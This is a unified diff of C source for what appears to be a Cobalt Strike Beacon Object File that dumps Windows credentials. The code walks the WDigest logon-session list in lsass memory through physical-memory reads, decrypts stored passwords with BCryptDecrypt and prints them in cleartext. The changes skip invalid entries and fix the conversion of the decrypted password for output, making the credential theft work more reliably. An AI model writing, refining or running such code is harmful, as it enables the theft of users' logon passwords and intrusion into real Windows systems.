@@ -54,6 +54,12 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
     }
     Flink = ReadAddressAtPhysicalAddressLocation(hFile, tmpPA);
 
+    //
+    // You can view structure of the WDigest list entry in lsass_offsets.h
+    //
+    
+
+    // !list -x "dS @$extret+0x30" poi(wdigest!l_LogSessList)
 
     int i = 0;
     while (Flink != l_LogSessListHead) // Did a full circle back to the beginning of the linked list
@@ -67,7 +73,7 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
 
         wchar_t* UserNameWideString = ReadUnicodeStringFromPhysical(hFile, FlinkPA + 0x30, lower32bits, LsassPID);
         if (UserNameWideString == NULL || *UserNameWideString == L'\0')
-            UserNameWideString = L"(null)";
+            UserNameWideString = L"(null)"; // - we should just loop again because it's an invalid entry        
 
         char UserNameString[MAX_PATH];
         bytesWritten = WideCharToMultiByte(CP_ACP, 0, UserNameWideString, -1, UserNameString, MAX_PATH, NULL, NULL);
@@ -101,8 +107,7 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
         // since this is a UnicodeString struct and offset 0x2 contains the max length, we get 0x52 from 0x50 + 0x2
         BYTE MaxLengthOfString = 0;
         ReadByte(hFile, FlinkPA + 0x52, &MaxLengthOfString);
-
-        if (MaxLengthOfString != 0)
+        if ( (_wcsicmp(UserNameWideString, L"(null)") != 0 ) && (MaxLengthOfString != 0) )
         {
             NTSTATUS status;
             ULONG cbResult = 0;
@@ -119,7 +124,16 @@ BOOL DisplayWDigestLogSessListInformation(HANDLE hFile, DWORD64 l_LogSessListHea
                 status = BCryptDecrypt(hKey, cryptoBlob, MaxLengthOfString, 0, InitializationVector, 8, bOutput, MaxLengthOfString, &cbResult, 0);
                 if (status == STATUS_SUCCESS)
                 {
-                    BeaconFormatPrintf(&outputbuffer, "\t    * Password    : %s\n", bOutput);
+                    char AsciiPasswordString[MAX_PATH];
+                    bytesWritten = WideCharToMultiByte(CP_ACP, 0, (wchar_t*)bOutput, -1, AsciiPasswordString, MAX_PATH, NULL, NULL);
+                    if (bytesWritten != 0)
+                    {
+                        BeaconFormatPrintf(&outputbuffer, "\t    * Password    : %s\n", AsciiPasswordString);
+                    }
+                    else
+                    {
+                        BeaconFormatPrintf(&outputbuffer, "\t    * Password    : (Failed to convert to MultiByte string)\n");
+                    }
                 }
                 else
                 {
